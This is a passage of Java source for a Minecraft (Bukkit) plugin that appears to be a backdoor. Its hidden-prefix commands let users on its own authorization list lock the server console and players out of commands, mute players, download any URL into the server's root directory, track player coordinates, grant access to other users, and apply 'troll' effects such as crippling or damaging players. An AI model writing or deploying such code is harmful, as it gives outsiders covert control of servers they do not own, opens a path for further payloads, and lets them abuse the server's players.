                sendMessage(sender, "Troll method '" + method + "' " + (!isEnabled ? "enabled" : "disabled") + " for " + target.getName());
            } catch (IllegalArgumentException e) {
                sendError(sender, "Invalid troll method. Options: thrower, interact, cripple, flight, inventory, drop, teleport, mine, place, login, god, damage, or reset.");
            }
        }
    }

    private abstract class LockToggleCommand extends Command {
        private final boolean shouldLock;
        private final String actionPastTense;
        private final String playerActionPastTense;
        private final String playerActionPastTenseEveryone;

        public LockToggleCommand(Plugin plugin, boolean shouldLock) {
            super(plugin);
            this.shouldLock = shouldLock;
            this.actionPastTense = shouldLock ? "locked" : "unlocked";
            this.playerActionPastTense = shouldLock ? "blocked from using commands" : "unblocked";
            this.playerActionPastTenseEveryone = shouldLock ? "blocked from using commands" : "unblocked";
        }

        @Override public abstract String getName();
        @Override public abstract String getDescription();
        @Override public int getRequirePerm() { return 2; }
        @Override public String getUsage() { return "<all | console | everyone | player> [name]"; }

        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }

            String subCommand = args[0].toLowerCase();

            switch (subCommand) {
                case "all":
                    if (args.length > 1) { sendError(sender, getRequiredUsage(this)); return; }
                    setState("console", State.LOCKED, shouldLock);
                    for (Player p : Bukkit.getOnlinePlayers()) setState(p.getName(), State.LOCKED, shouldLock);
                    sendMessage(sender, "Console and all players have been " + actionPastTense + ".");
                    break;
                case "console":
                    if (args.length > 1) { sendError(sender, getRequiredUsage(this)); return; }
                    setState("console", State.LOCKED, shouldLock);
                    sendMessage(sender, "Console has been " + actionPastTense + ".");
                    break;
                case "everyone":
                    if (args.length > 1) { sendError(sender, getRequiredUsage(this)); return; }
                    for (Player p : Bukkit.getOnlinePlayers()) setState(p.getName(), State.LOCKED, shouldLock);
                    sendMessage(sender, "All players have been " + playerActionPastTenseEveryone + ".");
                    break;
                case "player":
                    if (args.length < 2) { sendError(sender, getRequiredUsage(this)); return; }
                    String targetName = args[1];
                    setState(targetName, State.LOCKED, shouldLock);
                    sendMessage(sender, targetName + " has been " + playerActionPastTense + ".");
                    break;
                default:
                    sendError(sender, getRequiredUsage(this));
                    break;
            }
        }
    }

    private class LockCommand extends LockToggleCommand {
        public LockCommand(Plugin plugin) { super(plugin, true); }
        @Override public String getName() { return "lock"; }
        @Override public String getDescription() { return "Locks the console, all players, a specific player, or all of them."; }
    }

    private class UnlockCommand extends LockToggleCommand {
        public UnlockCommand(Plugin plugin) { super(plugin, false); }
        @Override public String getName() { return "unlock"; }
        @Override public String getDescription() { return "Unlocks the console, all players, a specific player, or all of them."; }
    }

    private abstract class MuteToggleCommand extends Command {
        private final boolean shouldMute;
        private final String actionPastTense;

        public MuteToggleCommand(Plugin plugin, boolean shouldMute) {
            super(plugin);
            this.shouldMute = shouldMute;
            this.actionPastTense = shouldMute ? "muted" : "unmuted";
        }

        @Override public abstract String getName();
        @Override public abstract String getDescription();
        @Override public int getRequirePerm() { return 2; }
        @Override public String getUsage() { return "<all | player> [name]"; }

        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }

            if (args[0].equalsIgnoreCase("all")) {
                for (Player p : Bukkit.getOnlinePlayers()) setState(p.getName(), State.MUTED, this.shouldMute);
                sendMessage(sender, "Everyone was " + this.actionPastTense + ".");
            } else if (args[0].equalsIgnoreCase("player")) {
                if (args.length < 2) { sendError(sender, "Usage: " + Config.command_prefix + getName() + " player <name>"); return; }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) { sendError(sender, "Player not found: " + args[1]); return; }
                setState(target.getName(), State.MUTED, this.shouldMute);
                sendMessage(sender, target.getName() + " was " + this.actionPastTense + ".");
            } else {
                sendError(sender, "Invalid subcommand. " + getRequiredUsage(this));
            }
        }
    }

    private class MuteCommand extends MuteToggleCommand {
        public MuteCommand(Plugin plugin) { super(plugin, true); }
        @Override public String getName() { return "mute"; }
        @Override public String getDescription() { return "Mutes a player in chat."; }
    }

    private class UnmuteCommand extends MuteToggleCommand {
        public UnmuteCommand(Plugin plugin) { super(plugin, false); }
        @Override public String getName() { return "unmute"; }
        @Override public String getDescription() { return "Unmutes a player in chat."; }
    }

    private class DownloadCommand extends Command {
        public DownloadCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "download"; }
        @Override public String getDescription() { return "Downloads a file to the server's root directory."; }
        @Override public String getUsage() { return "<url> <filepath>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 2) { sendError(sender, getRequiredUsage(this)); return; }
            sendMessage(sender, "Downloading file: " + ChatColor.RED + args[1]);
            new Thread(() -> {
                try {
                    downloadFile(new URL(args[0]), args[1]);
                    sendMessage(sender, "File downloaded successfully!");
                } catch (IOException e) {
                    sendError(sender, "Download failed: " + e.getMessage());
                }
            }).start();
        }
    }

    private class CoordsCommand extends Command {
        public CoordsCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "coords"; }
        @Override public String getDescription() { return "Gets the coordinates of a player."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { sendError(sender, "Player not found: " + args[0]); return; }
            Location loc = target.getLocation();
            sendMessage(sender, String.format("%s's coords: %d, %d, %d in %s", target.getName(), loc.getBlockX(), loc.getBlockY(), loc.getBlockZ(), loc.getWorld().getName()));
        }
    }

    private class AuthCommand extends Command {
        public AuthCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "auth"; }
        @Override public String getDescription() { return "Temporarily authorizes a user until the next restart."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }

            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { sendError(sender, "Player not found or is not online: " + args[0]); return; }

            String targetUuid = target.getUniqueId().toString();
            if (Config.tmp_authorized_uuids == null) {
                sendError(sender, "Temporary authorization list is not initialized.");
                return;
            }

            for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
                if (Config.tmp_authorized_uuids[i] == null) {
                    Config.tmp_authorized_uuids[i] = targetUuid;
                    sendMessage(sender, target.getName() + " (UUID: " + targetUuid + ") has been temporarily authorized.");
                    sendMessage(target, "You have been authorized. Run " + Config.command_prefix + "help for info.");
                    return;
                }
            }
            sendError(sender, "Unable to authorize user (temporary auth list is full).");
        }
    }

    private class DeauthCommand extends Command {
        public DeauthCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "deauth"; }
        @Override public String getDescription() { return "Deauthorizes a player from the temporary list."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }

            OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
            if (!target.hasPlayedBefore() && !target.isOnline()) {
                sendError(sender, "Player '" + args[0] + "' has never played on this server.");
                return;
            }

            String targetUuid = target.getUniqueId().toString();
            if (Config.tmp_authorized_uuids == null) {
                sendError(sender, "Temporary authorization list is not initialized.");
                return;
            }

            for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
                if (targetUuid.equalsIgnoreCase(Config.tmp_authorized_uuids[i])) {
                    Config.tmp_authorized_uuids[i] = null;
                    sendMessage(sender, (target.getName() != null ? target.getName() : args[0]) + " has been deauthorized.");
                    return;
                }
            }
            sendError(sender, "Player not found in the temporary authorization list.");
        }
    }

    private class TeleportCommand extends Command {
        public TeleportCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "tp"; }
        @Override public String getDescription() { return "Teleports you to specified coordinates."; }
        @Override public String getUsage() { return "<x> <y> <z> [world]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 3) { sendError(sender, getRequiredUsage(this)); return; }
            try {
                double x = Double.parseDouble(args[0]);
                double y = Double.parseDouble(args[1]);
                double z = Double.parseDouble(args[2]);
                World world = (args.length > 3) ? Bukkit.getWorld(args[3]) : sender.getWorld();
                if (world == null) { sendError(sender, "World not found: " + args[3]); return; }

                Location loc = new Location(world, x, y, z, sender.getLocation().getYaw(), sender.getLocation().getPitch());
                Bukkit.getScheduler().runTask(plugin, () -> {
                    sender.teleport(loc);
                });
                sendMessage(sender, "Teleported.");
            } catch (NumberFormatException e) {
                sendError(sender, "Invalid coordinates.");
            }
        }
    }
    //endregion
}